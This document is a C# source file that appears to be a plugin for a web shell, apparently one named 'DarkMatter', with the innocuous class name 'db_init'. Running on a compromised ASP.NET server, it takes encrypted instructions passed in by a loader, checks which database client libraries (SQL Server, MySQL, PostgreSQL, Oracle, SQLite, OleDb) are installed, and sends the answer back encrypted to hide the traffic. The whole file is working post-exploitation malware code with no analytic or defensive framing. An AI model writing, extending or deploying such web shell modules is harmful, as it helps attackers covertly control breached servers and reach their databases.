using System;
using System.Web;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Threading;

public class db_init
{
    private Dictionary<string, string> fnParseParams(string szParam)
    {
        Dictionary<string, string> dic = new Dictionary<string, string>();
        if (string.IsNullOrEmpty(szParam))
            return dic;

        string[] pairs = szParam.Split('&');
        foreach (string szPair in pairs)
        {
            int nIdx = szPair.IndexOf("=");
            if (nIdx > 0)
                dic[szPair.Substring(0, nIdx).Trim()] = szPair.Substring(nIdx + 1).Trim();
        }

        return dic;
    }

    private string fnB64Encode(string szInput) => Convert.ToBase64String(Encoding.UTF8.GetBytes(szInput));
    private string fnB64Decode(string szInput) => Encoding.UTF8.GetString(Convert.FromBase64String(szInput));

    private void fnWriteOutput(object driver, HttpResponse response, byte[] abOutput)
    {
        var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
        byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] {abOutput, 1});

        response.Clear();
        response.ContentType = "application/octet-stream";
        response.BinaryWrite(abEncryptedResp);
    }

    public bool Run()
    {
        HttpContext context = HttpContext.Current;
        if (context == null)
            return false;

        HttpRequest request = context.Request;
        HttpResponse response = context.Response;

        try
        {
            byte[] abPayload = (byte[])context.Items["payload"];
            object driver = context.Items["driver"];
            int nDllLength = (int)context.Items["len"];

            int nParamOffset = nDllLength + 4;
            int nParamLength = abPayload.Length - nParamOffset;
            string szParam = Encoding.UTF8.GetString(abPayload, nParamOffset, nParamLength).Trim();

            Dictionary<string, string> dic = fnParseParams(szParam);
            StringBuilder sb = new StringBuilder();

            Dictionary<string, string> dbProviders = new Dictionary<string, string>();
            dbProviders.Add("System.Data.SqlClient", "System.Data.SqlClient.SqlConnection");
            dbProviders.Add("Microsoft.Data.SqlClient", "Microsoft.Data.SqlClient.SqlConnection");
            dbProviders.Add("MySQL/Connector", "MySql.Data.MySqlClient.MySqlConnection");
            dbProviders.Add("PostgreSQL/Npgsql", "Npgsql.NpgsqlConnection");
            dbProviders.Add("Oracle/ODP.NET", "Oracle.ManagedDataAccess.Client.OracleConnection");
            dbProviders.Add("SQLite", "System.Data.SQLite.SQLiteConnection");
            dbProviders.Add("OleDb (Access/Excel)", "System.Data.OleDb.OleDbConnection");

            foreach (KeyValuePair<string, string> entry in dbProviders)
            {
                bool bAvailable = fnIsClassAvailable(entry.Value);
                int nAvailable = bAvailable ? 1 : 0;

                sb.Append(entry.Key + ":" + nAvailable + ",");
            }

            fnWriteOutput(driver, response, Encoding.UTF8.GetBytes(sb.ToString()));
        }
        catch (Exception ex)
        {
            response.Write("DARKMATTER_ERROR: " + ex.Message);
        }

        return true;
    }

    private bool fnIsClassAvailable(string szClassName)
    {
        try
        {
            Type type = Type.GetType(szClassName);
            if (type != null)
                return true;

            foreach (Assembly assembly in AppDomain.CurrentDomain.GetAssemblies())
            {
                if (assembly.GetType(szClassName) != null)
                {
                    return true;
                }
            }
            return false;
        }
        catch (Exception)
        {
            return false;
        }
    }
}